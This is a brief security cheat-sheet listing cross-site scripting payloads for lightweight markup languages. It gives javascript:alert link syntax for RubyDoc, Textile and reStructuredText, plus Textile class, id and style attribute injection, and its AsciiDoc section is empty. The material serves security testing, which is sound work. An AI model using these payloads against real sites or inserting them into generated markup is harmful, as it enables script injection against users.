__Lightweight Mark:up: language vulnerabilities__

So you might be familiar with some leightweight markup languages (LML) such as RubyDoc, Textile and reStructuredText, but have you ever tried finding security issues with them?

First check this [table](https://en.wikipedia.org/wiki/Lightweight_markup_language#Comparison_of_language_features) for all features the LML supports. Some LMLs support class and id attributes! This allows you to use predefined styles on the current page.

**RubyDoc (.rdoc)**

```
XSS[JavaScript:alert(1)]
```

**Textile (.textile)**

Surprisingly, Textilte supports a lot of things including the style attribute.

```
"Test link":javascript:alert(1)
p(#my-paragraph). This is a paragraph that has an id.
p(myclass). This is a paragraph that has a class.
div(myclass#myid). This div has both a CSS class and an id.
p{font-size: 0.8em}. Small font.
```

**reStructuredText (.rst)**

```
`Test link`__.  __ javascript:alert(document.domain)
```

**AsciiDoc (.adoc)**

```

```
